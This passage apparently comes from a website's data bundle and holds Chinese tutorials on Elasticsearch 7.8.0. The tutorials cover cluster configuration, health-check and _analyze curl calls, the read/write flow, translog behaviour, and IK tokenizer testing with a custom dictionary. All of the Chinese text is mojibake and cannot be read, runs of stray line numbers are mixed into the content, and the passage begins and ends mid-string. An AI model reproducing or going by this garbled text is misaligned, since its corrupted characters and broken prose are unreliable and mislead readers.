ç½®ï¼åå§åä¸ªæ°çéç¾¤æ¶éè¦æ­¤éç½®æ¥éä¸¾master\ndiscovery.seed_hosts: ["node1:9300","node2:9300","node3:9300"] # èç¹åç°\ngateway.recover_after_nodes: 2\nnetwork.tcp.keep_alive: true\nnetwork.tcp.no_delay: true\ntransport.tcp.compress: true\n\ncluster.routing.allocation.cluster_concurrent_rebalance: 16 # éç¾¤ååæ¶å¯å¨çæ°æ®ä»»å¡ä¸ªæ°ï¼é»è®¤æ¯2ä¸ª\ncluster.routing.allocation.node_concurrent_recoveries: 16 # æ·»å æå é¤èç¹åè´è½½åè¡¡æ¶å¹¶åæ¢å¤ççº¿ç¨ä¸ªæ°ï¼é»è®¤4ä¸ª\ncluster.routing.allocation.node_initial_primaries_recoveries: 16 # åå§åæ°æ®æ¢å¤æ¶ï¼å¹¶åæ¢å¤çº¿ç¨çä¸ªæ°ï¼é»è®¤4ä¸ª\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n\n\næä»¬å¯ä»¥éè¿ es æä¾çæ¥å£ api æ¥æ¥çéç¾¤çç¶æ\n\n# æ¥çèç¹\ncurl --location --request get \'http://10.240.30.93:9200/_cat/nodes\'\n\n# æ¥çéç¾¤ç¶æ\ncurl --location --request get \'http://10.240.30.93:9200/_cluster/health\'\n\n# è¿åä¿¡æ¯\n{\n    "cluster_name": "elasticsearch-1", // éç¾¤åç§°\n    "status": "yellow",\n    "timed_out": false,\n    "number_of_nodes": 1, // æå¤å°ä¸ªèç¹\n    "number_of_data_nodes": 1, // æå¤å°ä¸ªæ°æ®èç¹\n    "active_primary_shards": 2, // åç\n    "active_shards": 2,\n    "relocating_shards": 0,\n    "initializing_shards": 0,\n    "unassigned_shards": 2,\n    "delayed_unassigned_shards": 0,\n    "number_of_pending_tasks": 0,\n    "number_of_in_flight_fetch": 0,\n    "task_max_waiting_in_queue_millis": 0,\n    "active_shards_percent_as_number": 50.0\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nå½ä½ å¨åä¸å°æå¡å¨ä¸å¯å¨ä¸¤ä¸ªèç¹æ¶ï¼åªè¦ä»åç¬¬ä¸ä¸ªèç¹ç cluster.name éç½®ç¸åï¼å®å°±ä¼èªå¨åç°éç¾¤å¹¶å å¥å°å¶ä¸­ãå½è¥å¨ä¸åæå¡å¨å¯å¨ä¸¤ä¸ªèç¹ï¼å¦æè¦å å°åä¸ä¸ªéç¾¤ä¸­ï¼ä½ éè¦éç½®ä¸ä¸ªåæ­ä¸»æºåè¡¨ï¼ä¹æä»¥éç½®ä¸ºä½¿ç¨åæ­ï¼ä»¥é²æ­¢èç¹æ æå å¥å°æä¸ªéç¾¤ãåªæå¨åä¸å°æå¡å¨ä¸è¿è¡çèç¹æä¼èªå¨ç»æéç¾¤ã\n\nå¦æåºç°æªè¢«ååºçå¯æ¬ï¼åéç¾¤ç¶æä¼æ¯ï¼yellowï¼ï¼å¹¶ä¸ä»£è¡¨ä¸å¥åº·ï¼åªæ¯è¿äºå¯æ¬æ²¡æè¢«ææçåéåä½¿ç¨ï¼æä»¬å¯ä»¥æ ¹æ®æä»¬çå¯æ¬æ°éæ¥æ©å±æå¡å¨ï¼æ°å¯å¨çèç¹ä¼ç«é©¬è¢«å®æååäº«æåçåå¯æ¬æ°æ®ï¼å·²è¾¾å°æ¯ä¸ªåçåå¯æ¬å¨ä¸åçèç¹ã\n\nå½éç¾¤ä¸­è¿çä¸»èç¹æéï¼ä¼ä»éç¾¤ä¸­éåä¸ä¸ªèç¹ä¸ºä¸»èç¹ï¼å¹¶ä¸åçä¹ä¸ºä¸»åçï¼ææçåæä½ä¹é½ä¼è¿å¥å°è¿ä¸ªèç¹ã',charsets:{cjk:!0}},{title:"ES 7.8.0ï¼äºï¼ è¯»ãåååç´¢å¼æµç¨ä»¥åææ¡£åæè¿ç¨",frontmatter:{title:"ES 7.8.0ï¼äºï¼ è¯»ãåååç´¢å¼æµç¨ä»¥åææ¡£åæè¿ç¨",date:"2023-06-25T09:22:36.000Z",permalink:"/es/1801",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/05.Elasticsearch/1801.ES%207.8.0%EF%BC%88%E4%BA%8C%EF%BC%89%20%E8%AF%BB%E3%80%81%E5%86%99%E5%92%8C%E5%86%99%E7%B4%A2%E5%BC%95%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8A%E6%96%87%E6%A1%A3%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B.html",relativePath:"02.ä¸­é´ä»¶/05.Elasticsearch/1801.ES 7.8.0ï¼äºï¼ è¯»ãåååç´¢å¼æµç¨ä»¥åææ¡£åæè¿ç¨.md",key:"v-e5da1462",path:"/es/1801/",headers:[{level:2,title:"è¯»ååæ´æ°æµç¨",slug:"è¯»ååæ´æ°æµç¨",normalizedTitle:"è¯»ååæ´æ°æµç¨",charIndex:2},{level:2,title:"ESåç´¢å¼æµç¨",slug:"esåç´¢å¼æµç¨",normalizedTitle:"es åç´¢å¼æµç¨",charIndex:752},{level:2,title:"ææ¡£åæ",slug:"ææ¡£åæ",normalizedTitle:"ææ¡£åæ",charIndex:1496},{level:3,title:"åç½®åæå¨",slug:"åç½®åæå¨",normalizedTitle:"åç½®åæå¨",charIndex:1862},{level:3,title:"æµè¯åæå¨",slug:"æµè¯åæå¨",normalizedTitle:"æµè¯åæå¨",charIndex:2224}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"è¯»ååæ´æ°æµç¨ ESåç´¢å¼æµç¨ ææ¡£åæ åç½®åæå¨ æµè¯åæå¨",content:'# è¯»ååæ´æ°æµç¨\n\n\n\nP ä»£è¡¨çåçï¼R ä»£è¡¨çå¯æ¬ï¼ä»å¾ä¸­å¯ä»¥çåºæ 2 ä¸ªåçï¼æ¯ä¸ªåçå¨ä¸åçèç¹ä¸ï¼èä¸ä¸ªèç¹ä¸æå¶ä»åççå¯æ¬ï¼ES ä¸ºåé¨ä¼æåçåå¯æ¬ååçæ£å¨èç¹ä¸ãå·ä½åæµç¨å¦ä¸ï¼\n\n 1. å®¢æ·ç«¯è¯·æ±éç¾¤ï¼ä»»æï¼èç¹ï¼æ¾å°çèç¹ä¼è¢«ç§°ä¸ºåè°èç¹ï¼å¾ä¸­ä¸ºæå® node2 ä¸ºåè°èç¹\n 2. åè°èç¹å°è¯·æ±ç»è¿å¯¹æ°æ® hash (id) % åçæ°é å¾å°ç»æåè¯·æ±å°å¦ä¸ªèç¹æèªå·±ï¼å¾ä¸­ä¸º P0\n 3. ä¸»åçä¼å°è¯·æ±çæ°æ®è¿è¡ä¿å­\n 4. ä¸»åçä¼å°æ°æ®åéç»æ¥æè¯¥åçå¯æ¬çèç¹ï¼è¿è¡æ°æ®åæ­¥\n 5. å¯æ¬ä¿å­å®åè¿è¡æååé¦\n 6. ä¸»åçå¾å°åé¦åï¼æèªå·±çç»æä¸å¹¶åé¦ç»å®¢æ·ç«¯\n\nåæ°            æè¿°\nconsistency   é»è®¤å¼ï¼quorumï¼å³å¤§å¤æ°çåçå¯æ¬ç¶ææ²¡é®é¢å°±åè®¸æ§è¡åæä½ï¼oneï¼åªè¦ä¸»åçç¶æ ok\n              å°±åè®¸æ§è¡åæä½ï¼allï¼å¿é¡»ææä¸»åçåææå¯æ¬çç¶ææ²¡é®é¢æåè®¸æ§è¡åæä½\ntimeout       å¦ææ²¡æè¶³å¤çå¯æ¬ï¼ES ä¼ç­å¾ï¼å¸ææ´å¤çå¯æ¬åºç°ï¼é»è®¤æåµä¸æ¯ 1 åéï¼ä½ å¯ä»¥ä»»ææ´æ¹å¦ 30s\n\n\n\n 1. å®¢æ·ç«¯åéè¯·æ±å°åè°èç¹\n 2. åè°èç¹è®¡ç®å¾å°æ°æ®æå¨çåçä½ç½®ä»¥åå¨é¨çå¯æ¬ä½ç½®\n 3. å¾å°åçä½ç½®åå¯æ¬ææçä½ç½®ï¼ä¸ºè¾¾å°è´è½½åè¡¡ï¼è¿è¡è½®è®­ï¼æ¾å°ä¸ä¸ªä¸æ¯å¾å¿çèç¹ã\n 4. æè¯·æ±è½¬åç»èç¹ï¼èç¹å¾å°æ°æ®å¹¶è¿åç»å®¢æ·ç«¯ã\n\n\n\n 1. å®¢æ·ç«¯åéè¯·æ±å°åè°èç¹\n 2. åè°èç¹è®¡ç®å¾å°æ°æ®æå¨çåçä½ç½®ä»¥åå¨é¨çå¯æ¬ä½ç½®\n 3. ä¿®æ¹ï¼ä¸ºé²æ­¢å¤ä¸ªçº¿ç¨ä¿®æ¹ï¼ä»ä¼ä¸åçå°è¯ä¿®æ¹\n 4. ä¿®æ¹æååä¿®æ¹å¯æ¬ï¼å¯æ¬ä¿®æ¹æååä¼éç¥ä¸»åçï¼ä¸»åçå¨åé¦ç»å®¢æ·ç«¯\n\n\n# ES åç´¢å¼æµç¨\n\n\n\n 1. ç¨æ·åå»ºäºä¸ä¸ªæ°ææ¡£ï¼æ°ææ¡£è¢«åå¥åå­ä¸­ï¼\n 2. refresh æä½æäº¤ç¼å­ï¼è¿æ¶ç¼å­ä¸­æ°æ®ä¼ä»¥ segment çå½¢å¼è¢«ååå¥å°æä»¶ç¼å­ç³»ç»ãè¿æ¯å ä¸ºï¼æäº¤ä¸ä¸ªæ°ç segment å°ç£çéè¦ä¸ä¸ª fsync æ¥ç¡®ä¿ segment è¢«ç©çæ§å°åå¥ç£çï¼è¿æ ·å¨æ­çµçæ¶åå°±ä¸ä¼ä¸¢å¤±æ°æ®ã ä½æ¯ fsync æä½ä»£ä»·å¾å¤§ï¼å¦ææ¯æ¬¡ç´¢å¼ä¸ä¸ªææ¡£é½å»æ§è¡ä¸æ¬¡çè¯ä¼é æå¾å¤§çæ§è½é®é¢ï¼ä½æ¯è¿éæ° segment ä¼è¢«ååå¥å°æä»¶ç³»ç»ç¼å­ï¼è¿ä¸æ­¥ä»£ä»·ä¼æ¯è¾ä½ï¼\n 3. æ°ç segment è¢«åå¥å°æä»¶ç¼å­ç³»ç»ï¼è¿æ¶åå­ç¼å­è¢«æ¸ç©ºãå¨æä»¶ç¼å­ç³»ç»ä¼å­å¨ä¸ä¸ªæªæäº¤ç segmentãè½ç¶æ° segment æªè¢« commitï¼å·å°ç£çï¼ï¼ä½æ¯æä»¶å·²ç»å¨ç¼å­ä¸­äºï¼æ­¤æ¶å°±å¯ä»¥åå¶å®æä»¶ä¸æ ·è¢«æå¼åè¯»åäºï¼\n 4. å°ç®åä¸ºæ­¢ç´¢å¼ç segment è¿æªè¢«å·æ°å°ç£çï¼å¦ææ²¡æç¨ fsync ææ°æ®ä»æä»¶ç³»ç»ç¼å­å·ï¼flushï¼å°ç¡¬çï¼æä»¬ä¸è½ä¿è¯æ°æ®å¨æ­çµçè³æ¯ç¨åºæ­£å¸¸éåºä¹åä¾ç¶å­å¨ãElasticsearch å¢å äºä¸ä¸ª translog ï¼æèå«äºå¡æ¥å¿ï¼å¨æ¯ä¸æ¬¡å¯¹ Elasticsearch è¿è¡æä½æ¶åè¿è¡äºæ¥å¿è®°å½ãå¦ä¸å¾æç¤ºï¼ä¸ä¸ªææ¡£è¢«ç´¢å¼ä¹åï¼å°±ä¼è¢«æ·»å å°åå­ç¼å²åºï¼å¹¶ä¸åæ¶è¿½å å°äº translogï¼\n 5. æ¯éä¸æ®µæ¶é´ï¼æ´å¤çææ¡£è¢«æ·»å å°åå­ç¼å²åºåè¿½å å°äºå¡æ¥å¿ï¼translogï¼ï¼ä¹åæ° segment è¢«ä¸æ­ä»åå­ç¼å­åºè¢«åå¥å°æä»¶ç¼å­ç³»ç»ï¼è¿æ¶åå­ç¼å­è¢«æ¸ç©ºï¼ä½æ¯äºå¡æ¥å¿ä¸ä¼ãéç translog åå¾è¶æ¥è¶å¤§ï¼è¾¾å°ä¸å®ç¨åº¦åç´¢å¼è¢«å·æ°ï¼å¨å·æ°ï¼flushï¼ä¹åï¼segment è¢«å¨éæäº¤ï¼è¢«åå¥ç¡¬çï¼ã\n\n\n# ææ¡£åæ\n\nåæå¨åå« å°ä¸åææ¬åæåéäºåæç´¢å¼çç¬ç«çè¯æ¡ï¼å°è¿äºè¯æ¡ç»ä¸åä¸ºæ åæ ¼å¼ä»¥æé«å®ä»¬ç"å¯æç´¢"æ§ï¼æèrecallã åæå¨åçå¦ä¸çå·¥ä½ï¼ä½åæå¨åªåå«äºä¸ä¸ªä¸»è¦çåè½ï¼\n\n * å­ç¬¦è¿æ»¤å¨\n   é¦åï¼å­ç¬¦ä¸²æé¡ºåºéè¿æ¯ä¸ªå­ç¬¦è¿æ»¤å¨ï¼å®ä»¬çä»»å¡æ¯å¨åè¯åæ´çå­ç¬¦ä¸²ãä¸ä¸ªå­ç¬¦ä¸²è¿æ»¤å¨å¯ä»¥ç¨æ¥å»æ HTMLï¼æèå° & è½¬åä¸º andã\n * åè¯å¨\n   å¶æ¬¡ï¼å­ç¬¦ä¸²è¢«åè¯å¨åä¸ºåä¸ªçè¯æ¡ãä¸ä¸ªç®åçåè¯å¨éå°ç©ºæ ¼åæ ç¹çæ¶åï¼å¯è½ä¼å°ææ¬æåæè¯æ¡ã\n * Token è¿æ»¤å¨\n   æåï¼è¯æ¡æé¡ºåºéè¿æ¯ä¸ª Token è¿æ»¤å¨ãè¿ä¸ªè¿ç¨å¯è½ä¼æ¹åè¯æ¡ï¼ä¾å¦ï¼å°åå Quickï¼ï¼å é¤è¯æ¡ï¼ä¾å¦ï¼å aï¼andï¼the ç­æ ç¨è¯ï¼ï¼æèå¢å è¯æ¡ï¼ä¾å¦ï¼å jump å leap è¿ç§åä¹è¯ï¼\n\n\n# åç½®åæå¨\n\nElasticsearch è¿éå¸¦äºå¯ä»¥ç´æ¥ä½¿ç¨çé¢åè£çåæå¨ãæ¥ä¸æ¥æä»¬ä¼ååºæéè¦çåæå¨ï¼\n\n * æ ååæå¨\n   æ ååæå¨æ¯ Elasticsearch é»è®¤ä½¿ç¨çåæå¨ãå®æ¯åæåç§è¯­è¨ææ¬æå¸¸ç¨çéæ©ãä»æ ¹æ® Unicode èçå®ä¹çåè¯è¾¹çååææ¬ãå é¤ç»å¤§é¨åæ ç¹ãæåï¼å°ç»æ¡å°åã\n * ç®ååæå¨\n   ç®ååæå¨å¨ä»»ä½ä¸æ¯å­æ¯çå°æ¹åå²ææ¬ï¼å°è¯æ¡å°åã\n * ç©ºæ ¼åæå¨\n   ç©ºæ ¼åæå¨å¨ç©ºæ ¼çå°æ¹åææ¬ã\n * è¯­è¨åæå¨\n   ç¹å®è¯­è¨åæå¨å¯ç¨äºå¾å¤è¯­ãä»ä»¬å¯ä»¥èèæå®è¯­è¨çç¹ç¹ãä¾å¦ï¼è±è¯­åæå¨éå¸¦äºä¸ç»è±è¯­æ ç¨è¯ï¼å¸¸ç¨åè¯ï¼ä¾å¦ and æè theï¼ä»ä»¬å¯¹ç¸å³æ§æ²¡æå¤å°å½±åï¼ï¼ä»ä»¬ä¼è¢«å é¤ãç±äºçè§£è±è¯­è¯­æ³çè§åï¼è¿ä¸ªåè¯å¨å¯ä»¥æåè±è¯­åè¯çè¯å¹²ã\n\n\n# æµè¯åæå¨\n\næ ååæå¨\n\ncurl --location --request GET \'http://10.240.30.93:9200/user/_analyze\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "analyzer":"standard",\n    "text": "Text to analyzer"\n}\'\n\n{\n    "tokens": [\n        {\n            "token": "text", // token åè§£åçè¯æ¡\n            "start_offset": 0, // åç§»é\n            "end_offset": 4,\n            "type": "<ALPHANUM>",\n            "position": 0 // ä½ç½®\n        },\n        {\n            "token": "to",\n            "start_offset": 5,\n            "end_offset": 7,\n            "type": "<ALPHANUM>",\n            "position": 1\n        },\n        {\n            "token": "analyzer",\n            "start_offset": 8,\n            "end_offset": 16,\n            "type": "<ALPHANUM>",\n            "position": 2\n        }\n    ]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\nIK åè¯å¨ï¼è¿æ¬¾åè¯å¨æ¯ ES èªå¸¦ï¼å¹¶ä¸æ¯çæ³çé£ä¹å¥½\n\ncurl --location --request GET \'http://10.240.30.93:9200/user/_analyze\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "text": "æµè¯ç¨ä¾"\n}\'\n\n{\n    "tokens": [\n        {\n            "token": "æµ",\n            "start_offset": 0,\n            "end_offset": 1,\n            "type": "<IDEOGRAPHIC>",\n            "position": 0\n        },\n        {\n            "token": "è¯",\n            "start_offset": 1,\n            "end_offset": 2,\n            "type": "<IDEOGRAPHIC>",\n            "position": 1\n        },\n        {\n            "token": "ç¨",\n            "start_offset": 2,\n            "end_offset": 3,\n            "type": "<IDEOGRAPHIC>",\n            "position": 2\n        },\n        {\n            "token": "ä¾",\n            "start_offset": 3,\n            "end_offset": 4,\n            "type": "<IDEOGRAPHIC>",\n            "position": 3\n        }\n    ]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\nè¿æ¬¾ IK åè¯å¨æ¯ä¸ä¸ªæä»¶ï¼æ¯è¾æ¨èçï¼ä»æä¸¤ç§åè¯å¨ï¼ä¸ç§æ¯ ik_max_wordï¼ä¼å°ææ¬åæç»ååº¦çæåï¼ä¸ç§æ¯ ik_smartï¼ä¼å°ææ¬åæç²ç²åº¦çæåãè¯¥åè¯å¨åªéè¦ä¸è½½è§£åå° ES ç plugins æä»¶å¤¹ä¸ï¼å¹¶éå¯ ES å³å¯ã\n\n# ik_max_word\ncurl --location --request GET \'http://10.240.30.93:9200/user/_analyze\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "analyzer":"ik_max_word",\n    "text": "æµè¯ç¨ä¾"\n}\'\n\n{\n    "tokens": [\n        {\n            "token": "æµè¯",\n            "start_offset": 0,\n            "end_offset": 2,\n            "type": "CN_WORD",\n            "position": 0\n        },\n        {\n            "token": "è¯ç¨",\n            "start_offset": 1,\n            "end_offset": 3,\n            "type": "CN_WORD",\n            "position": 1\n        },\n        {\n            "token": "ä¾",\n            "start_offset": 3,\n            "end_offset": 4,\n            "type": "CN_CHAR",\n            "position": 2\n        }\n    ]\n}\n\n# ik_smart\ncurl --location --request GET \'http://10.240.30.93:9200/user/_analyze\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "analyzer":"ik_smart",\n    "text": "æµè¯ç¨ä¾"\n}\'\n\n{\n    "tokens": [\n        {\n            "token": "æµ",\n            "start_offset": 0,\n            "end_offset": 1,\n            "type": "CN_CHAR",\n            "position": 0\n        },\n        {\n            "token": "è¯ç¨",\n            "start_offset": 1,\n            "end_offset": 3,\n            "type": "CN_WORD",\n            "position": 1\n        },\n        {\n            "token": "ä¾",\n            "start_offset": 3,\n            "end_offset": 4,\n            "type": "CN_CHAR",\n            "position": 2\n        }\n    ]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n\n\nES ä¸­ä¹å¯ä»¥è¿è¡æ©å±è¯æ±ï¼é¦åè¿å¥ ES æ ¹ç®å½ä¸­ç plugins ç ik æä»¶å¤¹ä¸ï¼è¿å¥ config ç®å½ï¼åå»º custom.dic æä»¶ï¼åå¥å³é®è¯ãä¹åæå¼ IKAnalyzer.cfg.xml æä»¶ï¼å°æ°å»ºç custom.dic éç½®å¶ä¸­ï¼éå¯ ES æå¡å¨ã\nå¦ï¼å¼ ä¸å¥\n\n# åå»º custom.dic æä»¶ï¼é®å¥å³é®è¯ï¼å¹¶ä¿å­éåº\n# å¨ IKAnalyzer.cfg.xml æå®æä»¶\n<entry key="ext_dict">custom.dic</entry>\n\n\n1\n2\n3\n\n\næµè¯\n\n# éç½®ä¹å\ncurl --location --request GET \'http://10.240.30.93:9200/user/_analyze\' \\\n--header \'Content-Type: application/json\' \\\n--data-raw \'{\n    "analyzer":"ik_max_word",\n    "text": "å¼ ä¸å¥"\n}\'\n\n{\n    "tokens": [\n        {\n            "token": "å¼ ",\n            "start_offset": 0,\n            "end_offset": 1,\n            "type": "CN_CHAR",\n            "position": 0\n        },\n        {\n            "token": "ä¸",\n            "start_offset": 1,\n            "end_offset": 2,\n            "type": "TYPE_CNUM",\n            "position": 1\n        },\n        {\n            "token": "å¥",\n            "start_offset": 2,\n            "end_offset": 3,\n            "type": "CN_CHAR",\n            "position": 2\n        }\n    ]\n}\n\n# èªå®ä¹å\n{\n    "tokens": [\n        {\n            "token": "å¼ ä¸å¥",\n            "start_offset": 0,\n            "end_offset": 3,\n            "type": "CN_WORD",\n            "position": 0\n        },\n        {\n            "token": "ä¸",\n            "start_offset": 1,\n            "end_offset": 2,\n            "type": "TYPE_CNUM",\n            "position": 1\n        },\n        {\n            "token": "å¥",\n            "start_offset": 2,\n            "end_offset": 3,\n            "type": "CN_CHAR",\n            "position": 2\n        }\n    ]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n',normalizedContent:'# è¯»ååæ´æ°æµç¨\n\n\n\np ä»£è¡¨çåçï¼r ä»£è¡¨çå¯æ¬ï¼ä»å¾ä¸­å¯ä»¥çåºæ 2 ä¸ªåçï¼æ¯ä¸ªåçå¨ä¸åçèç¹ä¸ï¼èä¸ä¸ªèç¹ä¸æå¶ä»åççå¯æ¬ï¼es ä¸ºåé¨ä¼æåçåå¯æ¬ååçæ£å¨èç¹ä¸ãå·ä½åæµç¨å¦ä¸ï¼\n\n 1. å®¢æ·ç«¯è¯·æ±éç¾¤ï¼ä»»æï¼èç¹ï¼æ¾å°çèç¹ä¼è¢«ç§°ä¸ºåè°èç¹ï¼å¾ä¸­ä¸ºæå® node2 ä¸ºåè°èç¹\n 2. åè°èç¹å°è¯·æ±ç»è¿å¯¹æ°æ® hash (id) % åçæ°é å¾å°ç»æåè¯·æ±å°å¦ä¸ªèç¹æèªå·±ï¼å¾ä¸­ä¸º p0\n 3. ä¸»åçä¼å°è¯·æ±çæ°æ®è¿è¡ä¿å­\n 4. ä¸»åçä¼å°æ°æ®åéç»æ¥æè¯¥åçå¯æ¬çèç¹ï¼è¿è¡æ°æ®åæ­¥\n 5. å¯æ¬ä¿å­å®åè¿è¡æååé¦\n 6. ä¸»åçå¾å°åé¦åï¼æèªå·±çç»æä¸å¹¶åé¦ç»å®¢æ·ç«¯\n\nåæ°            æè¿°\nconsistency   é»è®¤å¼ï¼quorumï¼å³å¤§å¤æ°çåçå¯æ¬ç¶ææ²¡é®é¢å°±åè®¸æ§è¡åæä½ï¼oneï¼åªè¦ä¸»åçç¶æ ok\n              å°±åè®¸æ§è¡åæä½ï¼allï¼å¿é¡»ææä¸»åçåææå¯æ¬çç¶ææ²¡é®é¢æåè®¸æ§è¡åæä½\ntimeout       å¦ææ²¡æè¶³å¤çå¯æ¬ï¼es ä¼ç­å¾ï¼å¸ææ´å¤çå¯æ¬åºç°ï¼é»è®¤æåµä¸æ¯ 1 åéï¼ä½ å¯ä»¥ä»»ææ´æ¹å¦ 30s\n\n\n\n 1. å®¢æ·ç«¯åéè¯·æ±å°åè°èç¹\n 2. åè°èç¹è®¡ç®å¾å°æ°æ®æå¨çåçä½ç½®ä»¥åå¨é¨çå¯æ¬ä½ç½®\n 3. å¾å°åçä½ç½®åå¯æ¬ææçä½ç½®ï¼ä¸ºè¾¾å°è´è½½åè¡¡ï¼è¿è¡è½®è®­ï¼æ¾å°ä¸ä¸ªä¸æ¯å¾å¿çèç¹ã\n 4. æè¯·æ±è½¬åç»èç¹ï¼èç¹å¾å°æ°æ®å¹¶è¿åç»å®¢æ·ç«¯ã\n\n\n\n 1. å®¢æ·ç«¯åéè¯·æ±å°åè°èç¹\n 2. åè°èç¹è®¡ç®å¾å°æ°æ®æå¨çåçä½ç½®ä»¥åå¨é¨çå¯æ¬ä½ç½®\n 3. ä¿®æ¹ï¼ä¸ºé²æ­¢å¤ä¸ªçº¿ç¨ä¿®æ¹ï¼ä»ä¼ä¸åçå°è¯ä¿®æ¹\n 4. ä¿®æ¹æååä¿®æ¹å¯æ¬ï¼å¯æ¬ä¿®æ¹æååä¼éç¥ä¸»åçï¼ä¸»åçå¨åé¦ç»å®¢æ·ç«¯\n\n\n# es åç´¢å¼æµç¨\n\n\n\n 1. ç¨æ·åå»ºäºä¸ä¸ªæ°ææ¡£ï¼æ°ææ¡£è¢«åå¥åå­ä¸­ï¼\n 2. refresh æä½æäº¤ç¼å­ï¼è¿æ¶ç¼å­ä¸­æ°æ®ä¼ä»¥ segment çå½¢å¼è¢«ååå¥å°æä»¶ç¼å­ç³»ç»ãè¿æ¯å ä¸ºï¼æäº¤ä¸ä¸ªæ°ç segment å°ç£çéè¦ä¸ä¸ª fsync æ¥ç¡®ä¿ segment è¢«ç©çæ§å°åå¥ç£çï¼è¿æ ·å¨æ­çµçæ¶åå°±ä¸ä¼ä¸¢å¤±æ°æ®ã ä½æ¯ fsync æä½ä»£ä»·å¾å¤§ï¼å¦ææ¯æ¬¡ç´¢å¼ä¸ä¸ªææ¡£é½å»æ§è¡ä¸æ¬¡çè¯ä¼é æå¾å¤§çæ§è½é®é¢ï¼ä½æ¯è¿éæ° segment ä¼è¢«ååå¥å°æä»¶ç³»ç»ç¼å­ï¼è¿ä¸æ­¥ä»£ä»·ä¼æ¯è¾ä½ï¼\n 3. æ°ç segment è¢«åå¥å°æä»¶ç¼å­ç³»ç»ï¼è¿æ¶åå­ç¼å­è¢«æ¸ç©ºãå¨æä»¶ç¼å­ç³»ç»ä¼å­å¨ä¸ä¸ªæªæäº¤ç segmentãè½ç¶æ° segment æªè¢« commitï¼å·å°ç£çï¼ï¼ä½æ¯æä»¶å·²ç»å¨ç¼å­ä¸­äºï¼æ­¤æ¶å°±å¯ä»¥åå¶å®æä»¶ä¸æ ·è¢«æå¼åè¯»åäºï¼\n 4. å°ç®åä¸ºæ­¢ç´¢å¼ç segment è¿æªè¢«å·æ°å°ç£çï¼å¦ææ²¡æç¨ fsync ææ°æ®ä»æä»¶ç³»ç»ç¼å­å·ï¼flushï¼å°ç¡¬çï¼æä»¬ä¸è½ä¿è¯æ°æ®å¨æ­çµçè³æ¯ç¨åºæ­£å¸¸éåºä¹åä¾ç¶å­å¨ãelasticsearch å¢å äºä¸ä¸ª translog ï¼æèå«äºå¡æ¥å¿ï¼å¨æ¯ä¸æ¬¡å¯¹ elasticsearch è¿è¡æä½æ¶åè¿è¡äºæ¥å¿è®°å½ãå¦ä¸å¾æç¤ºï¼ä¸ä¸ªææ¡£è¢«ç´¢å¼ä¹åï¼å°±ä¼è¢«æ·»å å°åå­ç¼å²åºï¼å¹¶ä¸åæ¶è¿½å å°äº translogï¼\n 5. æ¯éä¸æ®µæ¶é´ï¼æ´å¤çææ¡£è¢«æ·»å å°åå­ç¼å²åºåè¿½å å°äºå¡æ¥å¿ï¼translogï¼ï¼ä¹åæ° segment è¢«ä¸æ­ä»åå­ç¼å­åºè¢«åå¥å°æä»¶ç¼å­ç³»ç»ï¼è¿æ¶åå­ç¼å­è¢«æ¸ç©ºï¼ä½æ¯äºå¡æ¥å¿ä¸ä¼ãéç translog åå¾è¶æ¥è¶å¤§ï¼è¾¾å°ä¸å®ç¨åº¦åç´¢å¼è¢«å·æ°ï¼å¨å·æ°ï¼flushï¼ä¹åï¼segment è¢«å¨éæäº¤ï¼è¢«åå¥ç¡¬çï¼ã\n\n\n# ææ¡£åæ\n\nåæå¨åå« å°ä¸åææ¬åæåéäºåæç´¢å¼çç¬ç«çè¯æ¡ï¼å°è¿äºè¯æ¡ç»ä¸åä¸ºæ åæ ¼å¼ä»¥æé«å®ä»¬ç"å¯æç´¢"æ§ï¼æèrecallã åæå¨åçå¦ä¸çå·¥ä½ï¼ä½åæå¨åªåå«äºä¸ä¸ªä¸»è¦çåè½ï¼\n\n * å­ç¬¦è¿æ»¤å¨\n   é¦åï¼å­ç¬¦ä¸²æé¡ºåºéè¿æ¯ä¸ªå­ç¬¦è¿æ»¤å¨ï¼å®ä»¬çä»»å¡æ¯å¨åè¯åæ´çå­ç¬¦ä¸²ãä¸ä¸ªå­ç¬¦ä¸²è¿æ»¤å¨å¯ä»¥ç¨æ¥å»æ htmlï¼æèå° & è½¬åä¸º andã\n * åè¯å¨\n   å